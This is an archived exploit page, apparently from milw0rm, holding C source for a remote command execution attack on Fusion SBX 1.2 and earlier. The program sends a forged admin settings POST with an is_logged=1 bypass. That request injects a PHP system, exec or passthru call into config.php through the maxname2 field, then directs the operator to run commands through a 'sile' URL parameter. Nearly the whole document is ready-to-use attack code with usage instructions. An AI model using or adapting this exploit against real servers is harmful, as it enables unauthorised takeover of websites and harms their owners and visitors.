<html>
<head>
<title>Fusion SBX <= 1.2 Remote Command Execution Exploit</title>
<pre>
/*****************************************************
*                                                    *
*  [Fusion SBX &lt;= 1.2] exploit                       *
*                                                    *
*  sileFSBXxpl                                       *
*                                                    *
*  This exploit use vulnerability found into         *
*  Fusion SBX and create new variable and call it    *
*  with a malicious function (stored in config.php). *
*  This exploit utilize injection of three diverse   *
*  procedures for execution of arbitrary code on     *
*  vulnerable machine with httpd privileges.         *
*                                                    *
*  References: www.securityfocus.org/bid/13575       * 
*                                                    *
*  coded by: Silentium of Anacron Group Italy        *
*      date: 10/05/2005                              *
*    e-mail: anacrongroupitaly[at]autistici[dot]org  *
*   my_home: www.autistici.org/anacron-group-italy   *
*                                                    *
*  this tool is developed under GPL license          *
*  no(c) .:. copyleft                                *
*                                                    *
*****************************************************/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

#define PORT 80		// port of web server 

void info(void);
void banner(void);
void sendxpl(FILE *out, char *argv[], int type);
void errsock(void);
void errgeth(void);
void errconn(char *argv[]);


int main(int argc, char *argv[]){

FILE *out;
int sock, sockconn, type;
struct sockaddr_in addr;
struct hostent *hp;

if(argc!=4)
   info();

type = atoi(argv[3]);

if(type &lt; 1 || type &gt; 3)
   info();

banner();
   
if((sock = socket(AF_INET,SOCK_STREAM,0)) &lt; 0)
   errsock();
   
   printf(&quot;[*] Creating socket		[OK]\n&quot;);

if((hp = gethostbyname(argv[1])) == NULL)
   errgeth();
   
   printf(&quot;[*] Resolving victim host	[OK]\n&quot;);
   
memset(&amp;addr,0,sizeof(addr));
memcpy((char *)&amp;addr.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT);
   
sockconn = connect(sock,(struct sockaddr *)&amp;addr,sizeof(addr));
if(sockconn &lt; 0)
   errconn(argv);
   
   printf(&quot;[*] Connecting at victim host   [OK]\n&quot;);
   
out = fdopen(sock,&quot;a&quot;);
setbuf(out,NULL);

sendxpl(out,argv,type);

   printf(&quot;[*] Now test at execute code on\n\n&quot; 
          &quot;[1] %s%sindex.php?sile=id\n&quot;
          &quot;[2] %s%sadmin/index.php?sile=id\n\n&quot;,argv[1],argv[2],argv[1],argv[2]);

shutdown(sock,2);
close(sock);

return 0;

}


void info(void){

system(&quot;clear&quot;);
printf(&quot;\n   #########################################\n&quot;
       &quot;   #             sileFSBXxpl               #\n&quot;
       &quot;   #  ###################################  #\n&quot;
       &quot;   #       Fusion SBX &lt;= 1.2 exploit       #\n&quot;
       &quot;   #       Remote Command Execution        #\n&quot;
       &quot;   #          coded by Silentium           #\n&quot;            
       &quot;   #        [ Anacron Group Italy ]        #\n&quot;
       &quot;   #  ###################################  #\n&quot;
       &quot;   # www.autistici.org/anacron-group-italy #\n&quot;
       &quot;   #########################################\n\n&quot;
       &quot; [Usage]\n\n&quot; 
       &quot;  sileFSBXxpl &lt;victim&gt; &lt;path_sbx&gt; &lt;type&gt;\n\n&quot;
       &quot;        [Type]\n\n&quot;
       &quot;              1) injection of system()\n&quot;
       &quot;              2) injection of exec()\n&quot;
       &quot;              3) injection of passthru()\n\n&quot;
       &quot; [Example]\n\n&quot;
       &quot;  sileFSBXxpl www.victim.com /sbx/ 1\n\n&quot;); 
exit(1);

}


void banner(void){

system(&quot;clear&quot;);
printf(&quot;[-] sileFSBXxpl\n&quot;
       &quot;    ============\n&quot;
       &quot;[-] Fusion SBX &lt;= 1.2 exploit\n&quot;
       &quot;[-] coded by Silentium - Anacron Group Italy\n&quot;
       &quot;[-] www.autistici.org/anacron-group-italy\n\n&quot;);
       
}
       

void sendxpl(FILE *out, char *argv[], int type){

char *call;
int size = 245;

if(type == 1)
   call = &quot;system&quot;;
else if(type == 2)
   call = &quot;exec&quot;;
else if(type == 3)
   call = &quot;passthru&quot;;

size+=strlen(call);
       
fprintf(out,&quot;POST %sadmin/?settings HTTP/1.0\n&quot;
            &quot;Connection: Keep-Alive\n&quot;
            &quot;Pragma: no-cache\n&quot;
            &quot;Cache-control: no-cache\n&quot;
            &quot;Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\n&quot;
            &quot;Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n&quot;
            &quot;Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n&quot;
            &quot;Accept-Language: en\n&quot;
            &quot;Host: %s\n&quot;
            &quot;Content-Type: application/x-www-form-urlencoded\n&quot;
            &quot;Content-Length: %d\n\n&quot;
            &quot;set2=basic&amp;admin_set2=standard&amp;lang2=english&amp;plimit2=10&amp;noname2=Guest&amp;&quot;
            &quot;refresh2=120&amp;maxname2=30%%3B%%40%s%%28%%24_GET%%5Bsile%%5D%%29&amp;maxmess&quot;
            &quot;2=120&amp;maxlink2=120&amp;wordbanning2=1&amp;maxword2=20&amp;wrapstat2=1&amp;postorder2=1&quot;
            &quot;&amp;setsubmit=Commit+Changes&amp;is_logged=1\n\n&quot;,argv[2],argv[1],size,call);
                                  
            printf(&quot;[*] Sending exploit		[OK]\n\n&quot;);

}
            
                 
void errsock(void){

system(&quot;clear&quot;);
printf(&quot;[x] Creating socket	[FAILED]\n\n&quot;);
exit(1);

}


void errgeth(void){

printf(&quot;[x] Resolving victim host	[FAILED]\n\n&quot;);
exit(1);

}


void errconn(char *argv[]){

printf(&quot;[x] Connecting at victim host	[FAILED]\n\n&quot;,argv[1]);
exit(1);

}</pre>
// milw0rm.com [2005-05-20]
</html>

